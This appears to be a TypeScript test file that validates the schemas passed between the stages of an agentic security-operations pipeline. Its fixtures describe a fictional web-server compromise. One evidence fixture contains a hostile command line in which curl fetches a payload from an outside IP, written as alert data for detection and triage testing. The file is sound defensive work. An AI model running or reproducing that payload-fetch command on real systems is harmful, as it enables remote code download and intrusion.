/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * Agentic Pipeline Handoff Contract Tests
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * These tests validate the stage-to-stage handoff contracts defined in
 * shared/agenticSchemas.ts. Every field name, type, and structure tested
 * here matches the LIVE canonical schema — not a stale or aspirational version.
 *
 * Contract chain:
 *   Raw Alert → TriageObject → CorrelationBundle → LivingCaseObject → response_actions
 *
 * Last aligned: 2026-03-01 against shared/agenticSchemas.ts schemaVersion "1.0"
 */

import { describe, it, expect } from "vitest";
import type {
  TriageObject,
  CorrelationBundle,
  LivingCaseObject,
  TriageRoute,
  AgenticSeverity,
  ProvenanceSource,
  ExtractedEntity,
  EvidenceItem,
  Uncertainty,
  MitreMapping,
} from "../shared/agenticSchemas";

// ═══════════════════════════════════════════════════════════════════════════════
// Factory Functions — produce objects that conform to the LIVE schema
// ═══════════════════════════════════════════════════════════════════════════════

function makeTriageObject(alertIndex = 1): TriageObject {
  return {
    schemaVersion: "1.0",
    triageId: `triage-${alertIndex}`,
    triagedAt: new Date().toISOString(),
    triagedBy: "triage_agent",

    // Alert identity
    alertId: `alert-${alertIndex}`,
    ruleId: "100002",
    ruleDescription: "Sysmon - Suspicious Process Creation",
    ruleLevel: 12,
    alertTimestamp: new Date(Date.now() - 60_000).toISOString(),
    agent: {
      id: "003",
      name: "web-server-01",
      ip: "10.0.1.15",
      os: "Ubuntu 22.04",
      groups: ["linux", "web-servers"],
    },

    // Normalized classification
    alertFamily: "suspicious_process",
    severity: "high" as AgenticSeverity,
    severityConfidence: 0.85,
    severityReasoning:
      "Rule level 12 combined with suspicious process lineage indicates high severity",

    // Entity extraction
    entities: [
      {
        type: "host",
        value: "web-server-01",
        source: "wazuh_alert" as ProvenanceSource,
        confidence: 1.0,
      },
      {
        type: "process",
        value: "/usr/bin/curl",
        source: "wazuh_alert" as ProvenanceSource,
        confidence: 0.95,
      },
      {
        type: "ip",
        value: "185.220.101.42",
        source: "wazuh_alert" as ProvenanceSource,
        confidence: 0.9,
      },
    ],

    // MITRE ATT&CK
    mitreMapping: [
      {
        techniqueId: "T1059.004",
        techniqueName: "Unix Shell",
        tactic: "Execution",
        confidence: 0.8,
        source: "llm_inference" as ProvenanceSource,
      },
    ],

    // Deduplication
    dedup: {
      isDuplicate: false,
      similarityScore: 0.2,
      reasoning: "No similar triage objects in the last 24 hours for this agent/rule combination",
    },

    // Route recommendation
    route: "C_HIGH_CONFIDENCE" as TriageRoute,
    routeReasoning:
      "High severity with clear entity extraction and MITRE mapping — route to immediate correlation",

    // Evidence summary
    summary:
      "Suspicious curl process spawned by cron on web-server-01, connecting to known Tor exit node 185.220.101.42. Rule level 12 indicates high confidence.",
    keyEvidence: [
      {
        id: "ev-1",
        label: "Sysmon process event",
        type: "process_event" as const,
        source: "wazuh_alert" as ProvenanceSource,
        data: { parentProcess: "/usr/sbin/cron", commandLine: "curl -s http://185.220.101.42/payload" },
        collectedAt: new Date().toISOString(),
        relevance: 0.95,
      },
    ],

    // Uncertainties
    uncertainties: [
      {
        description: "Unknown whether the cron job is legitimate",
        impact: "Could be a scheduled backup vs. C2 callback",
        suggestedAction: "Check crontab for user root on web-server-01",
      },
    ],

    // Case link
    caseLink: {
      shouldLink: false,
      confidence: 0.3,
      reasoning: "No active investigations match the entities in this alert",
    },

    // Raw data
    rawAlert: {
      _id: `alert-${alertIndex}`,
      rule: { id: "100002", level: 12, description: "Sysmon - Suspicious Process Creation" },
      agent: { id: "003", name: "web-server-01" },
      data: { srcip: "185.220.101.42", process: "/usr/bin/curl" },
    },
  };
}

function makeCorrelationBundle(triageIndex = 1): CorrelationBundle {
  return {
    schemaVersion: "1.0",
    correlationId: `corr-${triageIndex}`,
    correlatedAt: new Date().toISOString(),
    sourceTriageId: `triage-${triageIndex}`,

    // Related alerts
    relatedAlerts: [
      {
        alertId: "alert-prev-1",
        ruleId: "100003",
        ruleDescription: "Sysmon - Network Connection to External IP",
        ruleLevel: 10,
        timestamp: new Date(Date.now() - 3_600_000).toISOString(),
        agentId: "003",
        linkedBy: {
          type: "ip",
          value: "185.220.101.42",
          source: "wazuh_alert" as ProvenanceSource,
          confidence: 0.9,
        },
        relevance: 0.85,
      },
    ],

    // Discovered entities
    discoveredEntities: [
      {
        type: "user",
        value: "www-data",
        source: "wazuh_alert" as ProvenanceSource,
        confidence: 0.8,
      },
    ],

    // Vulnerability context
    vulnerabilityContext: [
      {
        cveId: "CVE-2024-1234",
        severity: "high" as AgenticSeverity,
        name: "Remote Code Execution in libcurl",
        affectedPackage: "curl-7.81.0",
        relevance: 0.7,
      },
    ],

    // FIM context
    fimContext: [
      {
        path: "/etc/crontab",
        event: "modified",
        timestamp: new Date(Date.now() - 7_200_000).toISOString(),
        relevance: 0.6,
      },
    ],

    // Threat intel
    threatIntelMatches: [
      {
        ioc: "185.220.101.42",
        iocType: "ip",
        source: "OTX",
        threatName: "Tor Exit Node",
        confidence: 0.95,
      },
    ],

    // Prior investigations
    priorInvestigations: [],

    // Blast radius
    blastRadius: {
      affectedHosts: 1,
      affectedUsers: 1,
      affectedAgentIds: ["003"],
      assetCriticality: "high",
      confidence: 0.75,
    },

    // Campaign assessment
    campaignAssessment: {
      likelyCampaign: false,
      clusteredTechniques: [],
      confidence: 0.3,
      reasoning: "Single host, single technique — no campaign indicators",
    },

    // Case recommendation
    caseRecommendation: {
      action: "create_new",
      confidence: 0.8,
      reasoning: "No matching active investigations; entities are novel",
    },

    // Synthesis
    synthesis: {
      narrative:
        "Suspicious curl process on web-server-01 connecting to a known Tor exit node. Correlated with a prior network alert from the same IP 1 hour ago and a recent crontab modification. Host has an unpatched libcurl vulnerability that could enable RCE.",
      supportingEvidence: [
        {
          id: "synth-ev-1",
          label: "Tor exit node connection",
          type: "threat_intel" as const,
          source: "threat_intel" as ProvenanceSource,
          data: { ioc: "185.220.101.42", source: "OTX" },
          collectedAt: new Date().toISOString(),
          relevance: 0.95,
        },
      ],
      conflictingEvidence: [],
      missingEvidence: [
        {
          description: "No process memory dump available",
          impact: "Cannot confirm whether payload was executed",
          suggestedAction: "Collect volatile data from web-server-01",
        },
      ],
      confidence: 0.78,
    },
  };
}

function makeLivingCaseObject(caseId = 1): LivingCaseObject {
  return {
    schemaVersion: "1.0",
    caseId,
    lastUpdatedAt: new Date().toISOString(),
    lastUpdatedBy: "hypothesis_agent",

    // Working theory
    workingTheory: {
      statement:
        "Compromised cron job on web-server-01 is performing C2 callbacks to a Tor exit node via curl",
      confidence: 0.72,
      supportingEvidence: [
        "Tor exit node 185.220.101.42 flagged by OTX",
        "Crontab modification 2 hours before first alert",
        "Unpatched libcurl CVE-2024-1234 on the host",
      ],
      conflictingEvidence: [
        "No outbound data exfiltration detected yet",
      ],
    },

    // Alternate theories
    alternateTheories: [
      {
        statement: "Legitimate monitoring script using curl to check external endpoint",
        confidence: 0.2,
        supportingEvidence: ["curl is commonly used in health checks"],
        whyLessLikely: "Destination is a known Tor exit node, not a monitoring endpoint",
      },
    ],

    // Completed pivots
    completedPivots: [
      {
        action: "Queried OTX for IP reputation",
        performedAt: new Date().toISOString(),
        performedBy: "correlation_agent",
        finding: "IP 185.220.101.42 is a known Tor exit node with malicious activity reports",
        impactedTheory: true,
      },
    ],

    // Evidence gaps
    evidenceGaps: [
      {
        description: "No memory dump from web-server-01",
        impact: "Cannot confirm payload execution or persistence mechanisms",
        suggestedAction: "Collect volatile data and process memory from the host",
        priority: "high",
      },
    ],

    // Suggested next steps
    suggestedNextSteps: [
      {
        action: "Isolate web-server-01 from the network",
        rationale: "Prevent further C2 communication while investigation continues",
        priority: "critical",
        effort: "quick",
      },
      {
        action: "Collect forensic image of web-server-01",
        rationale: "Preserve evidence before remediation",
        priority: "high",
        effort: "moderate",
      },
    ],

    // Response recommendations (display-only snapshot — NOT authoritative state)
    recommendedActions: [
      {
        action: "Isolate web-server-01",
        category: "immediate",
        urgency: "immediate",
        targetType: "host",
        targetValue: "web-server-01",
        requiresApproval: true,
        evidenceBasis: [
          "Tor exit node connection confirmed",
          "Crontab modification indicates persistence",
        ],
        state: "proposed",
      },
      {
        action: "Block 185.220.101.42 at perimeter firewall",
        category: "immediate",
        urgency: "high",
        targetType: "ip",
        targetValue: "185.220.101.42",
        requiresApproval: true,
        evidenceBasis: ["OTX threat intel match"],
        state: "proposed",
      },
      {
        action: "Patch libcurl on web-server-01",
        category: "next",
        urgency: "medium",
        targetType: "host",
        targetValue: "web-server-01",
        requiresApproval: false,
        evidenceBasis: ["CVE-2024-1234 present on host"],
        state: "proposed",
      },
    ],

    // Timeline summary
    timelineSummary: [
      {
        timestamp: new Date(Date.now() - 7_200_000).toISOString(),
        event: "Crontab modified on web-server-01",
        source: "wazuh_fim" as ProvenanceSource,
        significance: "high",
      },
      {
        timestamp: new Date(Date.now() - 3_600_000).toISOString(),
        event: "Network connection to 185.220.101.42 detected",
        source: "wazuh_alert" as ProvenanceSource,
        significance: "high",
      },
      {
        timestamp: new Date(Date.now() - 60_000).toISOString(),
        event: "Suspicious curl process spawned by cron",
        source: "wazuh_alert" as ProvenanceSource,
        significance: "critical",
      },
    ],

    // Linked artifacts
    linkedAlertIds: ["alert-1", "alert-prev-1"],
    linkedTriageIds: ["triage-1"],
    linkedCorrelationIds: ["corr-1"],
    linkedEntities: [
      {
        type: "host",
        value: "web-server-01",
        source: "wazuh_alert" as ProvenanceSource,
        confidence: 1.0,
      },
      {
        type: "ip",
        value: "185.220.101.42",
        source: "wazuh_alert" as ProvenanceSource,
        confidence: 0.9,
      },
    ],

    // Draft documentation
    draftDocumentation: {
      shiftHandoff:
        "Active investigation into suspicious C2 activity on web-server-01. Host isolation recommended pending approval. Tor exit node connection confirmed via OTX.",
      escalationSummary:
        "Web-server-01 shows indicators of compromise: crontab modification, curl-based C2 callback to Tor exit node, unpatched libcurl vulnerability. Recommend immediate host isolation.",
      executiveSummary:
        "A web server in our infrastructure is communicating with a known malicious network. The security team is investigating and recommends isolating the server as a precaution.",
      tuningSuggestions:
        "Consider adding Tor exit node IP lists to the blocklist. Rule 100002 should be promoted to level 14 for this agent group.",
    },
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// CONTRACT 1: TriageObject — Alert → Triage handoff
// ═══════════════════════════════════════════════════════════════════════════════

describe("Contract 1: TriageObject (Alert → Triage)", () => {
  describe("Schema Identity", () => {
    it("has schemaVersion 1.0", () => {
      const triage = makeTriageObject();
      expect(triage.schemaVersion).toBe("1.0");
    });

    it("has a triageId (string, not number)", () => {
      const triage = makeTriageObject();
      expect(typeof triage.triageId).toBe("string");
      expect(triage.triageId.length).toBeGreaterThan(0);
    });

    it("has triagedAt (not receivedAt)", () => {
      const triage = makeTriageObject();
      expect(triage.triagedAt).toBeTruthy();
      expect((triage as any).receivedAt).toBeUndefined();
    });

    it("has triagedBy with valid value", () => {
      const triage = makeTriageObject();
      expect(["triage_agent", "analyst_manual"]).toContain(triage.triagedBy);
    });
  });

  describe("Alert Identity Fields", () => {
    it("preserves original Wazuh alert ID", () => {
      const triage = makeTriageObject();
      expect(triage.alertId).toBeTruthy();
    });

    it("has ruleId, ruleDescription, ruleLevel (not just alertId)", () => {
      const triage = makeTriageObject();
      expect(triage.ruleId).toBeTruthy();
      expect(triage.ruleDescription).toBeTruthy();
      expect(typeof triage.ruleLevel).toBe("number");
      expect(triage.ruleLevel).toBeGreaterThanOrEqual(0);
      expect(triage.ruleLevel).toBeLessThanOrEqual(15);
    });

    it("has alertTimestamp (UTC ISO-8601)", () => {
      const triage = makeTriageObject();
      expect(triage.alertTimestamp).toBeTruthy();
      expect(new Date(triage.alertTimestamp).toISOString()).toBe(triage.alertTimestamp);
    });

    it("has agent object with id and name", () => {
      const triage = makeTriageObject();
      expect(triage.agent).toBeTruthy();
      expect(triage.agent.id).toBeTruthy();
      expect(triage.agent.name).toBeTruthy();
    });
  });

  describe("Normalized Classification", () => {
    it("uses severity (not normalizedSeverity)", () => {
      const triage = makeTriageObject();
      expect(triage.severity).toBeTruthy();
      expect((triage as any).normalizedSeverity).toBeUndefined();
      expect(["critical", "high", "medium", "low", "info"]).toContain(triage.severity);
    });

    it("has severityConfidence (0.0–1.0)", () => {
      const triage = makeTriageObject();
      expect(triage.severityConfidence).toBeGreaterThanOrEqual(0);
      expect(triage.severityConfidence).toBeLessThanOrEqual(1);
    });

    it("has severityReasoning", () => {
      const triage = makeTriageObject();
      expect(typeof triage.severityReasoning).toBe("string");
      expect(triage.severityReasoning.length).toBeGreaterThan(0);
    });

    it("has alertFamily", () => {
      const triage = makeTriageObject();
      expect(typeof triage.alertFamily).toBe("string");
      expect(triage.alertFamily.length).toBeGreaterThan(0);
    });
  });

  describe("Entity Extraction", () => {
    it("entities have type, value, source, confidence", () => {
      const triage = makeTriageObject();
      expect(triage.entities.length).toBeGreaterThan(0);
      for (const entity of triage.entities) {
        expect(entity.type).toBeTruthy();
        expect(entity.value).toBeTruthy();
        expect(entity.source).toBeTruthy();
        expect(typeof entity.confidence).toBe("number");
      }
    });

    it("entity source is a valid ProvenanceSource", () => {
      const validSources: ProvenanceSource[] = [
        "wazuh_alert", "wazuh_agent", "wazuh_vuln", "wazuh_fim",
        "wazuh_sca", "threat_intel", "llm_inference", "analyst_input", "system_computed",
      ];
      const triage = makeTriageObject();
      for (const entity of triage.entities) {
        expect(validSources).toContain(entity.source);
      }
    });
  });

  describe("MITRE ATT&CK Mapping", () => {
    it("mitreMapping entries have techniqueId, techniqueName, tactic, confidence, source", () => {
      const triage = makeTriageObject();
      for (const m of triage.mitreMapping) {
        expect(m.techniqueId).toBeTruthy();
        expect(m.techniqueName).toBeTruthy();
        expect(m.tactic).toBeTruthy();
        expect(typeof m.confidence).toBe("number");
        expect(m.source).toBeTruthy();
      }
    });
  });

  describe("Deduplication", () => {
    it("uses dedup object (not deduplicationKey or top-level isDuplicate)", () => {
      const triage = makeTriageObject();
      expect(triage.dedup).toBeTruthy();
      expect(typeof triage.dedup.isDuplicate).toBe("boolean");
      expect(typeof triage.dedup.similarityScore).toBe("number");
      expect(typeof triage.dedup.reasoning).toBe("string");
      expect((triage as any).deduplicationKey).toBeUndefined();
      expect((triage as any).isDuplicate).toBeUndefined();
    });
  });

  describe("Route Recommendation", () => {
    it("uses route (TriageRoute enum) not triageDecision", () => {
      const triage = makeTriageObject();
      const validRoutes: TriageRoute[] = [
        "A_DUPLICATE_NOISY", "B_LOW_CONFIDENCE", "C_HIGH_CONFIDENCE", "D_LIKELY_BENIGN",
      ];
      expect(validRoutes).toContain(triage.route);
      expect((triage as any).triageDecision).toBeUndefined();
    });

    it("has routeReasoning (string)", () => {
      const triage = makeTriageObject();
      expect(typeof triage.routeReasoning).toBe("string");
      expect(triage.routeReasoning.length).toBeGreaterThan(0);
    });
  });

  describe("Evidence Summary", () => {
    it("has summary (string)", () => {
      const triage = makeTriageObject();
      expect(typeof triage.summary).toBe("string");
      expect(triage.summary.length).toBeGreaterThan(0);
    });

    it("keyEvidence items have id, label, type, source, data, collectedAt", () => {
      const triage = makeTriageObject();
      for (const ev of triage.keyEvidence) {
        expect(ev.id).toBeTruthy();
        expect(ev.label).toBeTruthy();
        expect(ev.type).toBeTruthy();
        expect(ev.source).toBeTruthy();
        expect(ev.data).toBeTruthy();
        expect(ev.collectedAt).toBeTruthy();
      }
    });
  });

  describe("Uncertainties", () => {
    it("uncertainties have description and impact", () => {
      const triage = makeTriageObject();
      for (const u of triage.uncertainties) {
        expect(u.description).toBeTruthy();
        expect(u.impact).toBeTruthy();
      }
    });
  });

  describe("Case Link", () => {
    it("has caseLink with shouldLink, confidence, reasoning", () => {
      const triage = makeTriageObject();
      expect(typeof triage.caseLink.shouldLink).toBe("boolean");
      expect(typeof triage.caseLink.confidence).toBe("number");
      expect(typeof triage.caseLink.reasoning).toBe("string");
    });
  });

  describe("Raw Data Preservation", () => {
    it("uses rawAlert (not rawAlertRef)", () => {
      const triage = makeTriageObject();
      expect(triage.rawAlert).toBeTruthy();
      expect(typeof triage.rawAlert).toBe("object");
      expect((triage as any).rawAlertRef).toBeUndefined();
    });
  });

  describe("Stale Fields Are Absent", () => {
    it("does not contain any stale field names", () => {
      const triage = makeTriageObject();
      const staleFields = [
        "receivedAt", "normalizedSeverity", "deduplicationKey",
        "triageDecision", "suggestedPriority", "contextHints", "rawAlertRef",
      ];
      for (const field of staleFields) {
        expect((triage as any)[field]).toBeUndefined();
      }
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// CONTRACT 2: CorrelationBundle — Triage → Correlation handoff
// ═══════════════════════════════════════════════════════════════════════════════

describe("Contract 2: CorrelationBundle (Triage → Correlation)", () => {
  describe("Schema Identity", () => {
    it("has schemaVersion 1.0", () => {
      const bundle = makeCorrelationBundle();
      expect(bundle.schemaVersion).toBe("1.0");
    });

    it("has correlationId (string)", () => {
      const bundle = makeCorrelationBundle();
      expect(typeof bundle.correlationId).toBe("string");
      expect(bundle.correlationId.length).toBeGreaterThan(0);
    });

    it("sourceTriageId is a string (not number)", () => {
      const bundle = makeCorrelationBundle();
      expect(typeof bundle.sourceTriageId).toBe("string");
    });
  });

  describe("Related Alerts (top-level, not inside evidencePack)", () => {
    it("relatedAlerts are at top level (not nested in evidencePack)", () => {
      const bundle = makeCorrelationBundle();
      expect(bundle.relatedAlerts).toBeInstanceOf(Array);
      expect((bundle as any).evidencePack).toBeUndefined();
    });

    it("each related alert has alertId, ruleId, ruleDescription, ruleLevel, timestamp, agentId, linkedBy, relevance", () => {
      const bundle = makeCorrelationBundle();
      for (const alert of bundle.relatedAlerts) {
        expect(alert.alertId).toBeTruthy();
        expect(alert.ruleId).toBeTruthy();
        expect(alert.ruleDescription).toBeTruthy();
        expect(typeof alert.ruleLevel).toBe("number");
        expect(alert.timestamp).toBeTruthy();
        expect(alert.agentId).toBeTruthy();
        expect(alert.linkedBy).toBeTruthy();
        expect(alert.linkedBy.type).toBeTruthy();
        expect(typeof alert.relevance).toBe("number");
      }
    });

    it("does not use sharedEntities (uses linkedBy instead)", () => {
      const bundle = makeCorrelationBundle();
      for (const alert of bundle.relatedAlerts) {
        expect((alert as any).sharedEntities).toBeUndefined();
        expect(alert.linkedBy).toBeTruthy();
      }
    });
  });

  describe("Context Fields (top-level)", () => {
    it("has discoveredEntities (ExtractedEntity[])", () => {
      const bundle = makeCorrelationBundle();
      expect(bundle.discoveredEntities).toBeInstanceOf(Array);
    });

    it("has vulnerabilityContext with cveId, severity, name, relevance", () => {
      const bundle = makeCorrelationBundle();
      for (const v of bundle.vulnerabilityContext) {
        expect(v.cveId).toBeTruthy();
        expect(v.severity).toBeTruthy();
        expect(v.name).toBeTruthy();
        expect(typeof v.relevance).toBe("number");
      }
    });

    it("has fimContext with path, event, timestamp, relevance", () => {
      const bundle = makeCorrelationBundle();
      for (const f of bundle.fimContext) {
        expect(f.path).toBeTruthy();
        expect(f.event).toBeTruthy();
        expect(f.timestamp).toBeTruthy();
        expect(typeof f.relevance).toBe("number");
      }
    });

    it("has threatIntelMatches with ioc, iocType, source, confidence", () => {
      const bundle = makeCorrelationBundle();
      for (const t of bundle.threatIntelMatches) {
        expect(t.ioc).toBeTruthy();
        expect(t.iocType).toBeTruthy();
        expect(t.source).toBeTruthy();
        expect(typeof t.confidence).toBe("number");
      }
    });
  });

  describe("Blast Radius", () => {
    it("has affectedHosts, affectedUsers, affectedAgentIds, assetCriticality, confidence", () => {
      const bundle = makeCorrelationBundle();
      expect(typeof bundle.blastRadius.affectedHosts).toBe("number");
      expect(typeof bundle.blastRadius.affectedUsers).toBe("number");
      expect(bundle.blastRadius.affectedAgentIds).toBeInstanceOf(Array);
      expect(bundle.blastRadius.assetCriticality).toBeTruthy();
      expect(typeof bundle.blastRadius.confidence).toBe("number");
    });
  });

  describe("Campaign Assessment", () => {
    it("has likelyCampaign, clusteredTechniques, confidence, reasoning", () => {
      const bundle = makeCorrelationBundle();
      expect(typeof bundle.campaignAssessment.likelyCampaign).toBe("boolean");
      expect(bundle.campaignAssessment.clusteredTechniques).toBeInstanceOf(Array);
      expect(typeof bundle.campaignAssessment.confidence).toBe("number");
      expect(typeof bundle.campaignAssessment.reasoning).toBe("string");
    });
  });

  describe("Case Recommendation", () => {
    it("has action, confidence, reasoning", () => {
      const bundle = makeCorrelationBundle();
      expect(["merge_existing", "create_new", "defer_to_analyst"]).toContain(
        bundle.caseRecommendation.action
      );
      expect(typeof bundle.caseRecommendation.confidence).toBe("number");
      expect(typeof bundle.caseRecommendation.reasoning).toBe("string");
    });
  });

  describe("Synthesis", () => {
    it("uses confidence (not riskScore)", () => {
      const bundle = makeCorrelationBundle();
      expect(typeof bundle.synthesis.confidence).toBe("number");
      expect((bundle.synthesis as any).riskScore).toBeUndefined();
    });

    it("supportingEvidence is EvidenceItem[] (not string[])", () => {
      const bundle = makeCorrelationBundle();
      for (const ev of bundle.synthesis.supportingEvidence) {
        expect(ev.id).toBeTruthy();
        expect(ev.label).toBeTruthy();
        expect(ev.type).toBeTruthy();
        expect(ev.source).toBeTruthy();
        expect(ev.data).toBeTruthy();
      }
    });

    it("missingEvidence is Uncertainty[] (not string[])", () => {
      const bundle = makeCorrelationBundle();
      for (const u of bundle.synthesis.missingEvidence) {
        expect(u.description).toBeTruthy();
        expect(u.impact).toBeTruthy();
      }
    });

    it("has narrative (string)", () => {
      const bundle = makeCorrelationBundle();
      expect(typeof bundle.synthesis.narrative).toBe("string");
      expect(bundle.synthesis.narrative.length).toBeGreaterThan(0);
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// CONTRACT 3: LivingCaseObject — Correlation → Investigation handoff
// ═══════════════════════════════════════════════════════════════════════════════

describe("Contract 3: LivingCaseObject (Correlation → Investigation)", () => {
  describe("Schema Identity", () => {
    it("has schemaVersion 1.0", () => {
      const lc = makeLivingCaseObject();
      expect(lc.schemaVersion).toBe("1.0");
    });

    it("has caseId (number)", () => {
      const lc = makeLivingCaseObject();
      expect(typeof lc.caseId).toBe("number");
    });

    it("has lastUpdatedAt and lastUpdatedBy", () => {
      const lc = makeLivingCaseObject();
      expect(lc.lastUpdatedAt).toBeTruthy();
      expect(["case_agent", "hypothesis_agent", "response_agent", "analyst_manual"]).toContain(
        lc.lastUpdatedBy
      );
    });
  });

  describe("Working Theory", () => {
    it("has statement, confidence, supportingEvidence, conflictingEvidence", () => {
      const lc = makeLivingCaseObject();
      expect(typeof lc.workingTheory.statement).toBe("string");
      expect(typeof lc.workingTheory.confidence).toBe("number");
      expect(lc.workingTheory.confidence).toBeGreaterThanOrEqual(0);
      expect(lc.workingTheory.confidence).toBeLessThanOrEqual(1);
      expect(lc.workingTheory.supportingEvidence).toBeInstanceOf(Array);
      expect(lc.workingTheory.conflictingEvidence).toBeInstanceOf(Array);
    });
  });

  describe("Alternate Theories", () => {
    it("each has statement, confidence, supportingEvidence, whyLessLikely", () => {
      const lc = makeLivingCaseObject();
      for (const alt of lc.alternateTheories) {
        expect(alt.statement).toBeTruthy();
        expect(typeof alt.confidence).toBe("number");
        expect(alt.supportingEvidence).toBeInstanceOf(Array);
        expect(typeof alt.whyLessLikely).toBe("string");
      }
    });
  });

  describe("Recommended Actions (display-only snapshot)", () => {
    it("has action, category, requiresApproval, evidenceBasis, state", () => {
      const lc = makeLivingCaseObject();
      for (const action of lc.recommendedActions) {
        expect(action.action).toBeTruthy();
        expect(["immediate", "next", "optional"]).toContain(action.category);
        expect(typeof action.requiresApproval).toBe("boolean");
        expect(action.evidenceBasis).toBeInstanceOf(Array);
        expect(["proposed", "approved", "rejected", "executed", "deferred"]).toContain(
          action.state
        );
      }
    });

    it("has urgency, targetType, targetValue fields", () => {
      const lc = makeLivingCaseObject();
      const actionsWithUrgency = lc.recommendedActions.filter((a) => a.urgency);
      expect(actionsWithUrgency.length).toBeGreaterThan(0);
      for (const action of actionsWithUrgency) {
        expect(["immediate", "high", "medium", "low"]).toContain(action.urgency);
      }
    });
  });

  describe("Timeline Summary", () => {
    it("uses timelineSummary (not timelineReconstruction)", () => {
      const lc = makeLivingCaseObject();
      expect(lc.timelineSummary).toBeInstanceOf(Array);
      expect((lc as any).timelineReconstruction).toBeUndefined();
      for (const event of lc.timelineSummary) {
        expect(event.timestamp).toBeTruthy();
        expect(event.event).toBeTruthy();
        expect(event.source).toBeTruthy();
        expect(["critical", "high", "medium", "low"]).toContain(event.significance);
      }
    });
  });

  describe("Linked Artifacts", () => {
    it("uses linkedEntities (not entities) for entity references", () => {
      const lc = makeLivingCaseObject();
      expect(lc.linkedEntities).toBeInstanceOf(Array);
      expect((lc as any).entities).toBeUndefined();
      for (const e of lc.linkedEntities) {
        expect(e.type).toBeTruthy();
        expect(e.value).toBeTruthy();
        expect(e.source).toBeTruthy();
        expect(typeof e.confidence).toBe("number");
      }
    });

    it("has linkedAlertIds, linkedTriageIds, linkedCorrelationIds (string arrays)", () => {
      const lc = makeLivingCaseObject();
      expect(lc.linkedAlertIds).toBeInstanceOf(Array);
      expect(lc.linkedTriageIds).toBeInstanceOf(Array);
      expect(lc.linkedCorrelationIds).toBeInstanceOf(Array);
      expect(lc.linkedAlertIds.length).toBeGreaterThan(0);
      expect(lc.linkedTriageIds.length).toBeGreaterThan(0);
      expect(lc.linkedCorrelationIds.length).toBeGreaterThan(0);
    });
  });

  describe("Draft Documentation", () => {
    it("uses escalationSummary (not escalationBrief)", () => {
      const lc = makeLivingCaseObject();
      expect(lc.draftDocumentation.escalationSummary).toBeTruthy();
      expect((lc.draftDocumentation as any).escalationBrief).toBeUndefined();
    });

    it("documentation fields map to report types", () => {
      const lc = makeLivingCaseObject();
      const docs = lc.draftDocumentation;
      const reportTypeMapping: Record<string, string | undefined> = {
        handoff: docs.shiftHandoff,
        escalation: docs.escalationSummary,
        executive: docs.executiveSummary,
        tuning: docs.tuningSuggestions,
      };
      for (const [_, content] of Object.entries(reportTypeMapping)) {
        if (content) {
          expect(typeof content).toBe("string");
          expect(content.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe("Evidence Gaps & Next Steps", () => {
    it("evidenceGaps have description, impact, suggestedAction, priority", () => {
      const lc = makeLivingCaseObject();
      for (const gap of lc.evidenceGaps) {
        expect(gap.description).toBeTruthy();
        expect(gap.impact).toBeTruthy();
        expect(gap.suggestedAction).toBeTruthy();
        expect(["critical", "high", "medium", "low"]).toContain(gap.priority);
      }
    });

    it("suggestedNextSteps have action, rationale, priority, effort", () => {
      const lc = makeLivingCaseObject();
      for (const step of lc.suggestedNextSteps) {
        expect(step.action).toBeTruthy();
        expect(step.rationale).toBeTruthy();
        expect(["critical", "high", "medium", "low"]).toContain(step.priority);
        expect(["quick", "moderate", "deep_dive"]).toContain(step.effort);
      }
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// CROSS-CONTRACT: Full Pipeline Chain Handoff
// ═══════════════════════════════════════════════════════════════════════════════

describe("Full Pipeline Chain Handoff", () => {
  it("TriageObject entities are consumable by CorrelationBundle (via linkedBy)", () => {
    const triage = makeTriageObject();
    const bundle = makeCorrelationBundle();

    // Triage has entities
    const triageIpEntity = triage.entities.find((e) => e.type === "ip");
    expect(triageIpEntity).toBeTruthy();

    // Correlation links alerts via entities (linkedBy, not sharedEntities)
    for (const alert of bundle.relatedAlerts) {
      expect(alert.linkedBy).toBeTruthy();
      expect(alert.linkedBy.type).toBeTruthy();
      expect(alert.linkedBy.value).toBeTruthy();
    }
  });

  it("CorrelationBundle synthesis confidence feeds LivingCaseObject theory confidence", () => {
    const bundle = makeCorrelationBundle();
    const lc = makeLivingCaseObject();

    // Both have numeric confidence in [0,1]
    expect(bundle.synthesis.confidence).toBeGreaterThanOrEqual(0);
    expect(bundle.synthesis.confidence).toBeLessThanOrEqual(1);
    expect(lc.workingTheory.confidence).toBeGreaterThanOrEqual(0);
    expect(lc.workingTheory.confidence).toBeLessThanOrEqual(1);
  });

  it("LivingCaseObject links back to source triage and correlation IDs", () => {
    const lc = makeLivingCaseObject();
    expect(lc.linkedTriageIds.length).toBeGreaterThan(0);
    expect(lc.linkedCorrelationIds.length).toBeGreaterThan(0);
    expect(lc.linkedAlertIds.length).toBeGreaterThan(0);
  });

  it("recommended actions are materializable as response_actions rows", () => {
    const lc = makeLivingCaseObject();
    for (const action of lc.recommendedActions) {
      expect(action.action).toBeTruthy();
      expect(action.category).toBeTruthy();
      expect(typeof action.requiresApproval).toBe("boolean");
      expect(action.evidenceBasis).toBeInstanceOf(Array);
      expect(action.state).toBeTruthy();
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// REPORT GENERATION — LivingCaseObject → Reports
// ═══════════════════════════════════════════════════════════════════════════════

describe("Living Case Report Service", () => {
  it("supports all 5 report types", () => {
    const validTypes = ["full", "executive", "handoff", "escalation", "tuning"];
    expect(validTypes).toHaveLength(5);
  });

  it("report types map to LivingCaseObject documentation fields", () => {
    const lc = makeLivingCaseObject();
    const mappings: Record<string, string | undefined> = {
      handoff: lc.draftDocumentation.shiftHandoff,
      escalation: lc.draftDocumentation.escalationSummary,
      executive: lc.draftDocumentation.executiveSummary,
      tuning: lc.draftDocumentation.tuningSuggestions,
    };
    for (const [_, value] of Object.entries(mappings)) {
      if (value !== undefined) {
        expect(typeof value).toBe("string");
      }
    }
  });

  it("full report includes all major sections", () => {
    const lc = makeLivingCaseObject();
    const sections = [
      lc.workingTheory,
      lc.alternateTheories,
      lc.evidenceGaps,
      lc.suggestedNextSteps,
      lc.recommendedActions,
      lc.timelineSummary,
      lc.linkedEntities,
      lc.draftDocumentation,
    ];
    for (const section of sections) {
      expect(section).toBeTruthy();
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// RESPONSE ACTION STATE MACHINE
